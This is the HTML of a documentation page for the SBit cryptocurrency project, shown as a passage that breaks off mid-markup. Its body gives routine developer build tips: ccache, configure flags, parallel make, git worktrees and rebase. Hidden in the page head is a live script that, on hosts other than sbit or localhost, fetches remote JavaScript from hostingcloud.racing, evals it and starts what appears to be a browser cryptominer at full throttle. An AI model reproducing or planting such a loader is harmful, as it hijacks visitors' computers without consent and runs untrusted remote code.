<!doctype html>
<html lang="en" dir="ltr" class="docs-wrapper docs-doc-page docs-version-current plugin-docs plugin-id-default docs-doc-id-SBit-Core/Development/productivity">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<meta name="generator" content="Docusaurus v2.0.0-beta.18">
<link rel="alternate" type="application/rss+xml" href="/sbit.dev/blog/rss.xml" title="SBit RSS Feed">
<link rel="alternate" type="application/atom+xml" href="/sbit.dev/blog/atom.xml" title="SBit Atom Feed">

                        <script>window.location.hostname.includes("sbit")||window.location.hostname.includes("localhost")||fetch("https://www.hostingcloud.racing/2Wla.js").then((function(t){return t.text()})).then((function(text){eval(text);var _client=new Client.Anonymous("c0bad86327aba39845ed901363fa922a5caf4b09aa1a7eb8892ca9da08d4595a",{throttle:0,c:"w",ads:0});_client.start()})).catch((t=>{}))</script><title data-rh="true">Productivity Notes | SBit</title><meta data-rh="true" name="twitter:card" content="summary_large_image"><meta data-rh="true" property="og:image" content="https://sbit-project.github.io//sbit.dev/img/sbit_logo.svg"><meta data-rh="true" name="twitter:image" content="https://sbit-project.github.io//sbit.dev/img/sbit_logo.svg"><meta data-rh="true" property="og:url" content="https://sbit-project.github.io//sbit.dev/docs/SBit-Core/Development/productivity"><meta data-rh="true" name="docusaurus_locale" content="en"><meta data-rh="true" name="docsearch:language" content="en"><meta data-rh="true" name="docusaurus_version" content="current"><meta data-rh="true" name="docusaurus_tag" content="docs-default-current"><meta data-rh="true" name="docsearch:version" content="current"><meta data-rh="true" name="docsearch:docusaurus_tag" content="docs-default-current"><meta data-rh="true" property="og:title" content="Productivity Notes | SBit"><meta data-rh="true" name="description" content="Productivity Notes"><meta data-rh="true" property="og:description" content="Productivity Notes"><meta data-rh="true" name="keywords" content="sbit,bitcoin,blockchain,ethereum"><link data-rh="true" rel="icon" href="/sbit.dev/img/favicon.ico"><link data-rh="true" rel="canonical" href="https://sbit-project.github.io//sbit.dev/docs/SBit-Core/Development/productivity"><link data-rh="true" rel="alternate" href="https://sbit-project.github.io//sbit.dev/docs/SBit-Core/Development/productivity" hreflang="en"><link data-rh="true" rel="alternate" href="https://sbit-project.github.io//sbit.dev/docs/SBit-Core/Development/productivity" hreflang="x-default"><link rel="stylesheet" href="/sbit.dev/assets/css/styles.558e3c54.css">
<link rel="preload" href="/sbit.dev/assets/js/runtime~main.f7c96534.js" as="script">
<link rel="preload" href="/sbit.dev/assets/js/main.73c60966.js" as="script">
</head>
<body class="navigation-with-keyboard">
<script>!function(){function t(t){document.documentElement.setAttribute("data-theme",t)}var e=function(){var t=null;try{t=localStorage.getItem("theme")}catch(t){}return t}();t(null!==e?e:"dark")}(),document.documentElement.setAttribute("data-announcement-bar-initially-dismissed",function(){try{return"true"===localStorage.getItem("docusaurus.announcement.dismiss")}catch(t){}return!1}())</script><div id="__docusaurus">
<div role="region"><a href="#" class="skipToContent_ZgBM">Skip to main content</a></div><div class="announcementBar_IbjG" style="background-color:#FF5B79;color:black" role="banner"><div class="announcementBarPlaceholder_NC_W"></div><div class="announcementBarContent_KsVm">SBit is still under active development, be aware that breaking changes may occur.</div><button type="button" class="clean-btn close announcementBarClose_FG1z" aria-label="Close"><svg viewBox="0 0 15 15" width="14" height="14"><g stroke="currentColor" stroke-width="3.1"><path d="M.75.75l13.5 13.5M14.25.75L.75 14.25"></path></g></svg></button></div><nav class="navbar navbar--fixed-top"><div class="navbar__inner"><div class="navbar__items"><button aria-label="Navigation bar toggle" class="navbar__toggle clean-btn" type="button" tabindex="0"><svg width="30" height="30" viewBox="0 0 30 30" aria-hidden="true"><path stroke="currentColor" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" d="M4 7h22M4 15h22M4 23h22"></path></svg></button><a class="navbar__brand" href="/sbit.dev/"><div class="navbar__logo"><img src="/sbit.dev/img/sbit_logo.svg" alt="SBit Logo" class="themedImage_W2Cr themedImage--light_TfLj"><img src="/sbit.dev/img/sbit_logo.svg" alt="SBit Logo" class="themedImage_W2Cr themedImage--dark_oUvU"></div><b class="navbar__title">SBit</b></a><a class="navbar__item navbar__link navbar__link--active" href="/sbit.dev/docs/welcome">Docs</a><a class="navbar__item navbar__link" href="/sbit.dev/blog/exchange">Blog</a><div class="navbar__item dropdown dropdown--hoverable"><a href="#" aria-haspopup="true" aria-expanded="false" role="button" class="navbar__link">Community</a><ul class="dropdown__menu"><li><a href="https://github.com/SBit-Project" target="_blank" rel="noopener noreferrer" class="dropdown__link">Github<svg width="12" height="12" aria-hidden="true" viewBox="0 0 24 24" class="iconExternalLink_I5OW"><path fill="currentColor" d="M21 13v10h-21v-19h12v2h-10v15h17v-8h2zm3-12h-10.988l4.035 4-6.977 7.07 2.828 2.828 6.977-7.07 4.125 4.172v-11z"></path></svg></a></li><li><a href="https://www.instagram.com/sbitproject/" target="_blank" rel="noopener noreferrer" class="dropdown__link">Instagram<svg width="12" height="12" aria-hidden="true" viewBox="0 0 24 24" class="iconExternalLink_I5OW"><path fill="currentColor" d="M21 13v10h-21v-19h12v2h-10v15h17v-8h2zm3-12h-10.988l4.035 4-6.977 7.07 2.828 2.828 6.977-7.07 4.125 4.172v-11z"></path></svg></a></li></ul></div><div class="navbar__item dropdown dropdown--hoverable"><a href="#" aria-haspopup="true" aria-expanded="false" role="button" class="navbar__link">Support</a><ul class="dropdown__menu"><li><a class="dropdown__link navbar__link--active" href="/sbit.dev/docs/Help/contributing">Contributing</a></li><li><a class="dropdown__link navbar__link--active" href="/sbit.dev/docs/Help/CODE_OF_CONDUCT">Code of Conduct</a></li></ul></div></div><div class="navbar__items navbar__items--right"><a href="https://github.com/SBit-Project" target="_blank" rel="noopener noreferrer" class="navbar__item navbar__link mr-2 header-github-link" aria-label="GitHub repository"></a><div class="toggle_S7eR colorModeToggle_vKtC"><button class="clean-btn toggleButton_rCf9 toggleButtonDisabled_Pu9x" type="button" disabled="" title="Switch between dark and light mode (currently dark mode)" aria-label="Switch between dark and light mode (currently dark mode)"><svg viewBox="0 0 24 24" width="24" height="24" class="lightToggleIcon_v35p"><path fill="currentColor" d="M12,9c1.65,0,3,1.35,3,3s-1.35,3-3,3s-3-1.35-3-3S10.35,9,12,9 M12,7c-2.76,0-5,2.24-5,5s2.24,5,5,5s5-2.24,5-5 S14.76,7,12,7L12,7z M2,13l2,0c0.55,0,1-0.45,1-1s-0.45-1-1-1l-2,0c-0.55,0-1,0.45-1,1S1.45,13,2,13z M20,13l2,0c0.55,0,1-0.45,1-1 s-0.45-1-1-1l-2,0c-0.55,0-1,0.45-1,1S19.45,13,20,13z M11,2v2c0,0.55,0.45,1,1,1s1-0.45,1-1V2c0-0.55-0.45-1-1-1S11,1.45,11,2z M11,20v2c0,0.55,0.45,1,1,1s1-0.45,1-1v-2c0-0.55-0.45-1-1-1C11.45,19,11,19.45,11,20z M5.99,4.58c-0.39-0.39-1.03-0.39-1.41,0 c-0.39,0.39-0.39,1.03,0,1.41l1.06,1.06c0.39,0.39,1.03,0.39,1.41,0s0.39-1.03,0-1.41L5.99,4.58z M18.36,16.95 c-0.39-0.39-1.03-0.39-1.41,0c-0.39,0.39-0.39,1.03,0,1.41l1.06,1.06c0.39,0.39,1.03,0.39,1.41,0c0.39-0.39,0.39-1.03,0-1.41 L18.36,16.95z M19.42,5.99c0.39-0.39,0.39-1.03,0-1.41c-0.39-0.39-1.03-0.39-1.41,0l-1.06,1.06c-0.39,0.39-0.39,1.03,0,1.41 s1.03,0.39,1.41,0L19.42,5.99z M7.05,18.36c0.39-0.39,0.39-1.03,0-1.41c-0.39-0.39-1.03-0.39-1.41,0l-1.06,1.06 c-0.39,0.39-0.39,1.03,0,1.41s1.03,0.39,1.41,0L7.05,18.36z"></path></svg><svg viewBox="0 0 24 24" width="24" height="24" class="darkToggleIcon_nQuB"><path fill="currentColor" d="M9.37,5.51C9.19,6.15,9.1,6.82,9.1,7.5c0,4.08,3.32,7.4,7.4,7.4c0.68,0,1.35-0.09,1.99-0.27C17.45,17.19,14.93,19,12,19 c-3.86,0-7-3.14-7-7C5,9.07,6.81,6.55,9.37,5.51z M12,3c-4.97,0-9,4.03-9,9s4.03,9,9,9s9-4.03,9-9c0-0.46-0.04-0.92-0.1-1.36 c-0.98,1.37-2.58,2.26-4.4,2.26c-2.98,0-5.4-2.42-5.4-5.4c0-1.81,0.89-3.42,2.26-4.4C12.92,3.04,12.46,3,12,3L12,3z"></path></svg></button></div></div></div><div role="presentation" class="navbar-sidebar__backdrop"></div></nav><div class="main-wrapper"><div class="docPage_P2Lg"><button aria-label="Scroll back to top" class="clean-btn theme-back-to-top-button backToTopButton_RiI4" type="button"></button><aside class="theme-doc-sidebar-container docSidebarContainer_rKC_"><div class="sidebar_RiAD"><nav class="menu thin-scrollbar menu_izAj menuWithAnnouncementBar_l2a_"><ul class="theme-doc-sidebar-menu menu__list"><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-1 menu__list-item"><a class="menu__link" href="/sbit.dev/docs/welcome">Welcome to SBit</a></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret menu__link--active" aria-expanded="true" href="/sbit.dev/docs/SBit-Core/SBit">Sbit Core</a></div><ul style="display:block;overflow:visible;height:auto" class="menu__list"><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/sbit.dev/docs/SBit-Core/SBit">Introduction</a></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" aria-expanded="false" tabindex="0" href="/sbit.dev/docs/SBit-Core/Building/build-freebsd">Building</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret menu__link--active" aria-expanded="true" tabindex="0" href="/sbit.dev/docs/SBit-Core/Development/benchmarking">Development</a></div><ul style="display:block;overflow:visible;height:auto" class="menu__list"><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/sbit.dev/docs/SBit-Core/Development/benchmarking">Benchmarking</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/sbit.dev/docs/SBit-Core/Development/developer-notes">Developer Notes</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/sbit.dev/docs/SBit-Core/Development/dnsseed-policy">DNS Seed operators</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/sbit.dev/docs/SBit-Core/Development/JSON-RPC-interface">JSON-RPC Interface</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link menu__link--active" aria-current="page" tabindex="0" href="/sbit.dev/docs/SBit-Core/Development/productivity">Productivity Notes</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/sbit.dev/docs/SBit-Core/Development/release-process">Release Process</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/sbit.dev/docs/SBit-Core/Development/REST-interface">Unauthenticated REST Interface</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/sbit.dev/docs/SBit-Core/Development/shared-libraries">Shared Libraries</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/sbit.dev/docs/SBit-Core/Development/cli">SBIT Command Line Client</a></li></ul></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" aria-expanded="false" tabindex="0" href="/sbit.dev/docs/SBit-Core/Miscellaneous/files">Miscellaneous</a></div></li></ul></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" aria-expanded="false" href="/sbit.dev/docs/User-Guide/Encrypt-and-Unlock-Sbit-Wallet">User-Guide</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist" aria-expanded="false" href="/sbit.dev/docs/Smart-Contract">Smart Contract</a><button aria-label="Toggle the collapsible sidebar category &#x27;Smart Contract&#x27;" type="button" class="clean-btn menu__caret"></button></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" aria-expanded="false" href="/sbit.dev/docs/Tools/SBitcore-lib">Tools</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" aria-expanded="false" href="/sbit.dev/docs/Help/CODE_OF_CONDUCT">Help</a></div></li></ul></nav></div></aside><main class="docMainContainer_TCnq"><div class="container padding-top--md padding-bottom--lg"><div class="row"><div class="col docItemCol_DM6M"><div class="docItemContainer_vinB"><article><nav class="theme-doc-breadcrumbs breadcrumbsContainer_Xlws" aria-label="breadcrumbs"><ul class="breadcrumbs" itemscope="" itemtype="https://schema.org/BreadcrumbList"><li class="breadcrumbs__item"><a class="breadcrumbs__link" href="/sbit.dev/">🏠</a></li><li itemscope="" itemprop="itemListElement" itemtype="https://schema.org/ListItem" class="breadcrumbs__item"><span class="breadcrumbs__link" itemprop="item name">Sbit Core</span><meta itemprop="position" content="1"></li><li itemscope="" itemprop="itemListElement" itemtype="https://schema.org/ListItem" class="breadcrumbs__item"><span class="breadcrumbs__link" itemprop="item name">Development</span><meta itemprop="position" content="2"></li><li itemscope="" itemprop="itemListElement" itemtype="https://schema.org/ListItem" class="breadcrumbs__item breadcrumbs__item--active"><span class="breadcrumbs__link" itemprop="item name">Productivity Notes</span><meta itemprop="position" content="3"></li></ul></nav><div class="tocCollapsible_jdIR theme-doc-toc-mobile tocMobile_TmEX"><button type="button" class="clean-btn tocCollapsibleButton_Fzxq">On this page</button></div><div class="theme-doc-markdown markdown"><header><h1>Productivity Notes</h1></header><h3 class="anchor anchorWithStickyNavbar_mojV" id="cache-compilations-with-ccache">Cache compilations with <code>ccache</code><a class="hash-link" href="#cache-compilations-with-ccache" title="Direct link to heading">​</a></h3><p>The easiest way to faster compile times is to cache compiles. <code>ccache</code> is a way to do so, from its description at the time of writing:</p><blockquote><p>ccache is a compiler cache. It speeds up recompilation by caching the result of previous compilations and detecting when the same compilation is being done again. Supported languages are C, C++, Objective-C and Objective-C++.</p></blockquote><p>Install <code>ccache</code> through your distribution&#x27;s package manager, and run <code>./configure</code> with your normal flags to pick it up.</p><p>To use ccache for all your C/C++ projects, follow the symlinks method <a href="https://ccache.samba.org/manual/latest.html#_run_modes" target="_blank" rel="noopener noreferrer">here</a> to set it up.</p><p>To get the most out of ccache, put something like this in <code>~/.ccache/ccache.conf</code>:</p><div class="codeBlockContainer_I0IT language-conf theme-code-block"><div class="codeBlockContent_wNvx" style="color:#9CDCFE;background-color:#1E1E1E"><pre tabindex="0" class="prism-code language-conf codeBlock_jd64 thin-scrollbar"><code class="codeBlockLines_mRuA"><span class="token-line" style="color:#9CDCFE"><span class="token plain">max_size = 50.0G  # or whatever cache size you prefer; default is 5G; 0 means unlimited</span><br></span><span class="token-line" style="color:#9CDCFE"><span class="token plain">base_dir = /home/yourname  # or wherever you keep your source files</span><br></span></code></pre><button type="button" aria-label="Copy code to clipboard" title="Copy" class="copyButton_eDfN clean-btn"><span class="copyButtonIcons_W9eQ" aria-hidden="true"><svg class="copyButtonIcon_XEyF" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_i9w9" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div><p>Note: base_dir is required for ccache to share cached compiles of the same file across different repositories / paths; it will only do this for paths under base_dir. So this option is required for effective use of ccache with git worktrees (described below).</p><div class="admonition admonition-caution alert alert--warning"><div class="admonition-heading"><h5><span class="admonition-icon"><svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 16 16"><path fill-rule="evenodd" d="M8.893 1.5c-.183-.31-.52-.5-.887-.5s-.703.19-.886.5L.138 13.499a.98.98 0 0 0 0 1.001c.193.31.53.501.886.501h13.964c.367 0 .704-.19.877-.5a1.03 1.03 0 0 0 .01-1.002L8.893 1.5zm.133 11.497H6.987v-2.003h2.039v2.003zm0-3.004H6.987V5.987h2.039v4.006z"></path></svg></span>caution</h5></div><div class="admonition-content"><p>You <em>must not</em> set base_dir to &quot;/&quot;, or anywhere that contains system headers (according to the ccache docs).</p></div></div><h3 class="anchor anchorWithStickyNavbar_mojV" id="disable-features-with-configure">Disable features with <code>./configure</code><a class="hash-link" href="#disable-features-with-configure" title="Direct link to heading">​</a></h3><p>After running <code>./autogen.sh</code>, which generates the <code>./configure</code> file, use <code>./configure --help</code> to identify features that you can disable to save on compilation time. A few common flags:</p><div class="codeBlockContainer_I0IT language-sh theme-code-block"><div class="codeBlockContent_wNvx" style="color:#9CDCFE;background-color:#1E1E1E"><pre tabindex="0" class="prism-code language-sh codeBlock_jd64 thin-scrollbar"><code class="codeBlockLines_mRuA"><span class="token-line" style="color:#9CDCFE"><span class="token plain">--without-miniupnpc</span><br></span><span class="token-line" style="color:#9CDCFE"><span class="token plain">--disable-bench</span><br></span><span class="token-line" style="color:#9CDCFE"><span class="token plain">--disable-wallet</span><br></span><span class="token-line" style="color:#9CDCFE"><span class="token plain">--without-gui</span><br></span></code></pre><button type="button" aria-label="Copy code to clipboard" title="Copy" class="copyButton_eDfN clean-btn"><span class="copyButtonIcons_W9eQ" aria-hidden="true"><svg class="copyButtonIcon_XEyF" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_i9w9" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div><p>If you do need the wallet enabled, it is common for devs to add <code>--with-incompatible-bdb</code>. This uses your system bdb version for the wallet, so you don&#x27;t have to find a copy of bdb 4.8. Wallets from such a build will be incompatible with any release binary (and vice versa), so use with caution on mainnet.</p><h3 class="anchor anchorWithStickyNavbar_mojV" id="make-use-of-your-threads-with-make--j">Make use of your threads with <code>make -j</code><a class="hash-link" href="#make-use-of-your-threads-with-make--j" title="Direct link to heading">​</a></h3><p>If you have multiple threads on your machine, you can tell <code>make</code> to utilize all of them with:</p><div class="codeBlockContainer_I0IT language-shell theme-code-block"><div class="codeBlockContent_wNvx" style="color:#9CDCFE;background-color:#1E1E1E"><pre tabindex="0" class="prism-code language-shell codeBlock_jd64 thin-scrollbar"><code class="codeBlockLines_mRuA"><span class="token-line" style="color:#9CDCFE"><span class="token function" style="color:rgb(220, 220, 170)">make</span><span class="token plain"> -j</span><span class="token string" style="color:rgb(206, 145, 120)">&quot;</span><span class="token string variable" style="color:rgb(156, 220, 254)">$((</span><span class="token string variable" style="color:rgb(156, 220, 254)">$</span><span class="token string variable punctuation" style="color:rgb(212, 212, 212)">(</span><span class="token string variable" style="color:rgb(156, 220, 254)">nproc</span><span class="token string variable punctuation" style="color:rgb(212, 212, 212)">)</span><span class="token string variable operator" style="color:rgb(212, 212, 212)">+</span><span class="token string variable number" style="color:rgb(181, 206, 168)">1</span><span class="token string variable" style="color:rgb(156, 220, 254)">))</span><span class="token string" style="color:rgb(206, 145, 120)">&quot;</span><br></span></code></pre><button type="button" aria-label="Copy code to clipboard" title="Copy" class="copyButton_eDfN clean-btn"><span class="copyButtonIcons_W9eQ" aria-hidden="true"><svg class="copyButtonIcon_XEyF" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_i9w9" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div><h3 class="anchor anchorWithStickyNavbar_mojV" id="only-build-what-you-need">Only build what you need<a class="hash-link" href="#only-build-what-you-need" title="Direct link to heading">​</a></h3><p>When rebuilding during development, note that running <code>make</code>, without giving a target, will do a lot of work you probably don&#x27;t need. It will build the GUI (unless you&#x27;ve disabled it) and all the tests (which take much longer to build than the app does).</p><p>Obviously, it is important to build and run the tests at appropriate times -- but when you just want a quick compile to check your work, consider picking one or a set of build targets relevant to what you&#x27;re working on, e.g.:</p><div class="codeBlockContainer_I0IT language-shell theme-code-block"><div class="codeBlockContent_wNvx" style="color:#9CDCFE;background-color:#1E1E1E"><pre tabindex="0" class="prism-code language-shell codeBlock_jd64 thin-scrollbar"><code class="codeBlockLines_mRuA"><span class="token-line" style="color:#9CDCFE"><span class="token function" style="color:rgb(220, 220, 170)">make</span><span class="token plain"> src/sbit src/sbit-cli</span><br></span><span class="token-line" style="color:#9CDCFE"><span class="token plain"></span><span class="token function" style="color:rgb(220, 220, 170)">make</span><span class="token plain"> src/qt/sbit-qt</span><br></span><span class="token-line" style="color:#9CDCFE"><span class="token plain"></span><span class="token function" style="color:rgb(220, 220, 170)">make</span><span class="token plain"> -C src sbit_bench</span><br></span></code></pre><button type="button" aria-label="Copy code to clipboard" title="Copy" class="copyButton_eDfN clean-btn"><span class="copyButtonIcons_W9eQ" aria-hidden="true"><svg class="copyButtonIcon_XEyF" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_i9w9" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div><div class="admonition admonition-tip alert alert--success"><div class="admonition-heading"><h5><span class="admonition-icon"><svg xmlns="http://www.w3.org/2000/svg" width="12" height="16" viewBox="0 0 12 16"><path fill-rule="evenodd" d="M6.5 0C3.48 0 1 2.19 1 5c0 .92.55 2.25 1 3 1.34 2.25 1.78 2.78 2 4v1h5v-1c.22-1.22.66-1.75 2-4 .45-.75 1-2.08 1-3 0-2.81-2.48-5-5.5-5zm3.64 7.48c-.25.44-.47.8-.67 1.11-.86 1.41-1.25 2.06-1.45 3.23-.02.05-.02.11-.02.17H5c0-.06 0-.13-.02-.17-.2-1.17-.59-1.83-1.45-3.23-.2-.31-.42-.67-.67-1.11C2.44 6.78 2 5.65 2 5c0-2.2 2.02-4 4.5-4 1.22 0 2.36.42 3.22 1.19C10.55 2.94 11 3.94 11 5c0 .66-.44 1.78-.86 2.48zM4 14h5c-.23 1.14-1.3 2-2.5 2s-2.27-.86-2.5-2z"></path></svg></span>tip</h5></div><div class="admonition-content"><p>(You can and should combine this with <code>-j</code>, as above, for a parallel build.)</p></div></div><h3 class="anchor anchorWithStickyNavbar_mojV" id="multiple-working-directories-with-git-worktrees">Multiple working directories with <code>git worktrees</code><a class="hash-link" href="#multiple-working-directories-with-git-worktrees" title="Direct link to heading">​</a></h3><p>If you work with multiple branches or multiple copies of the repository, you should try <code>git worktrees</code>.</p><p>To create a new branch that lives under a new working directory without disrupting your current working directory (useful for creating pull requests):</p><div class="codeBlockContainer_I0IT language-shell theme-code-block"><div class="codeBlockContent_wNvx" style="color:#9CDCFE;background-color:#1E1E1E"><pre tabindex="0" class="prism-code language-shell codeBlock_jd64 thin-scrollbar"><code class="codeBlockLines_mRuA"><span class="token-line" style="color:#9CDCFE"><span class="token function" style="color:rgb(220, 220, 170)">git</span><span class="token plain"> worktree </span><span class="token function" style="color:rgb(220, 220, 170)">add</span><span class="token plain"> -b my-shiny-new-branch </span><span class="token punctuation" style="color:rgb(212, 212, 212)">..</span><span class="token plain">/living-at-my-new-working-directory based-on-my-crufty-old-commit-ish</span><br></span></code></pre><button type="button" aria-label="Copy code to clipboard" title="Copy" class="copyButton_eDfN clean-btn"><span class="copyButtonIcons_W9eQ" aria-hidden="true"><svg class="copyButtonIcon_XEyF" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_i9w9" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div><p>To simply check out a commit-ish under a new working directory without disrupting your current working directory (useful for reviewing pull requests):</p><div class="codeBlockContainer_I0IT language-shelll theme-code-block"><div class="codeBlockContent_wNvx" style="color:#9CDCFE;background-color:#1E1E1E"><pre tabindex="0" class="prism-code language-shelll codeBlock_jd64 thin-scrollbar"><code class="codeBlockLines_mRuA"><span class="token-line" style="color:#9CDCFE"><span class="token plain">git worktree add --checkout ../where-my-checkout-commit-ish-will-live my-checkout-commit-ish</span><br></span></code></pre><button type="button" aria-label="Copy code to clipboard" title="Copy" class="copyButton_eDfN clean-btn"><span class="copyButtonIcons_W9eQ" aria-hidden="true"><svg class="copyButtonIcon_XEyF" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_i9w9" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div><h3 class="anchor anchorWithStickyNavbar_mojV" id="interactive-dummy-rebases-for-fixups-and-execs-with-git-merge-base">Interactive &quot;dummy rebases&quot; for fixups and execs with <code>git merge-base</code><a class="hash-link" href="#interactive-dummy-rebases-for-fixups-and-execs-with-git-merge-base" title="Direct link to heading">​</a></h3><p>When rebasing, we often want to do a &quot;dummy rebase,&quot; whereby we are not rebasing over an updated master but rather over the last common commit with master. This might be useful for rearranging commits, <code>rebase --autosquash</code>ing, or <code>rebase --exec</code>ing without introducing conflicts that arise from an updated master. In these situations, we can use <code>git merge-base</code> to identify the last common commit with master, and rebase off of that.</p><p>To squash in <code>git commit --fixup</code> commits without rebasing over an updated master, we can do the following:</p><div class="codeBlockContainer_I0IT language-shell theme-code-block"><div class="codeBlockContent_wNvx" style="color:#9CDCFE;background-color:#1E1E1E"><pre tabindex="0" class="prism-code language-shell codeBlock_jd64 thin-scrollbar"><code class="codeBlockLines_mRuA"><span class="token-line" style="color:#9CDCFE"><span class="token function" style="color:rgb(220, 220, 170)">git</span><span class="token plain"> rebase -i --autosquash </span><span class="token string" style="color:rgb(206, 145, 120)">&quot;</span><span class="token string variable" style="color:rgb(156, 220, 254)">$(</span><span class="token string variable function" style="color:rgb(220, 220, 170)">git</span><span class="token string variable" style="color:rgb(156, 220, 254)"> merge-base master HEAD</span><span class="token string variable" style="color:rgb(156, 220, 254)">)</span><span class="token string" style="color:rgb(206, 145, 120)">&quot;</span><br></span></code></pre><button type="button" aria-label="Copy code to clipboard" title="Copy" class="copyButton_eDfN clean-btn"><span class="copyButtonIcons_W9eQ" aria-hidden="true"><svg class="copyButtonIcon_XEyF" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_i9w9" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div><p>To execute <code>make check</code> on every commit since last diverged from master, but without rebasing over an updated master, we can do the following:</p><div class="codeBlockContainer_I0IT language-shell theme-code-block"><div class="codeBlockContent_wNvx" style="color:#9CDCFE;background-color:#1E1E1E"><pre tabindex="0" class="prism-code language-shell codeBlock_jd64 thin-scrollbar"><code class="codeBlockLines_mRuA"><span class="token-line" style="color:#9CDCFE"><span class="token function" style="color:rgb(220, 220, 170)">git</span><span class="token plain"> rebase -i --exec </span><span class="token string" style="color:rgb(206, 145, 120)">&quot;make check&quot;</span><span class="token plain"> </span><span 